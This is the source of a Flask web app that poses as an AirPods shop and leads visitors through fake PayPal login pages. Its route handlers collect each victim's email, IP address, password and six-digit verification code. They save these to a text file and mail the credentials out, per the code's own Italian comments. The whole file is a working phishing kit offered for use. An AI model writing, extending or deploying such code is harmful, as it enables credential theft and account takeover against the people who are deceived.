from flask import Flask, render_template, request
from src.LogData import LogData

app = Flask(__name__)
app_data = LogData()


@app.route('/')
def home():  # put application's code here
    return render_template('index.html')


@app.route('/shop')
def shop():
    return render_template('shop.html')


@app.route('/product-airpods-1')
def product_1():
    return render_template('product-1.html')


@app.route('/product-airpods-2')
def product_2():
    return render_template('product-2.html')


@app.route('/product-airpods-3')
def product_3():
    return render_template('product-3.html')


@app.route('/pay-products-order_sign-email')
def email():
    return render_template('paypal-email.html')


@app.route('/pay-products-order_sign-password', methods=['POST'])
def on_submit_email():
    email = request.form.get('email')
    client_ip = request.remote_addr  # Ottieni l'indirizzo IP del client

    # Se il sito è dietro un proxy, usa l'header 'X-Forwarded-For'
    if request.headers.getlist("X-Forwarded-For"):
        client_ip = request.headers.getlist("X-Forwarded-For")[0]

    app_data.setIp(client_ip)  # salva ip
    app_data.setEmail(email)  # salva email

    return render_template('paypal-password.html')


@app.route('/verify-number', methods=['POST'])
def on_password_submit():
    password = request.form.get('password')

    app_data.setPassword(password)

    return render_template('verify-number.html')


@app.route('/order-complete', methods=['POST'])
def on_verify_number():
    number = ''
    for i in range(6):
        number += request.form.get(f'number-{i + 1}')

    app_data.setNumber(number)

    app_data.writeData('./src/userdata.txt')  # scrivi i dati ottenuti nel file txt
    app_data.sendEmail() # manda l'email con le credenziali

    return render_template('order-complete.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
    # run command on cmd -> flask --app app run.
    # app, not --app, is the name of your file main.py

